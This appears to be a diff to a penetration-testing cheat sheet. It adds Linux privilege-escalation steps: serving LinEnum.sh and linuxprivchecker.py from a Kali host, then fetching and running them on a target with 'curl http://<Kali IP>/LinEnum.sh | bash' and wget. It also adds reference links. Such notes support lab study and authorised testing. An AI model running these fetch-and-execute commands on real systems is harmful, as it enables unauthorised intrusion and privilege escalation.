@@ -2,6 +2,40 @@
 
 ## Linux
 
+### LinEnum.sh
+
+- HTTP
+
+Host the file
+```
+cd /opt/linux_privesc
+sudo python -m http.server 80
+```
+
+```
+curl http://<Kali IP>/LinEnum.sh | bash
+```
+
+```
+wget http://<Kali IP>/LinEnum.sh
+bash LinEnum.sh
+```
+
+### linuxprivchecker.py
+
+- HTTP
+
+Host the file
+```
+cd /opt/linux_privesc
+sudo python -m http.server 80
+```
+
+```
+wget http://<Kali IP>/linuxprivchecker.py
+python linuxprivchecker.py
+```
+
 
 ## Windows
 
@@ -75,3 +109,10 @@ copy \\<Kali IP>\share\PowerUp.ps1 .
 Import-Module .\PowerUp.ps1
 Invoke-AllChecks
 ```
+
+
+# Links
+
+- [Basic Linux privilege escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+- [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
+- [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker)
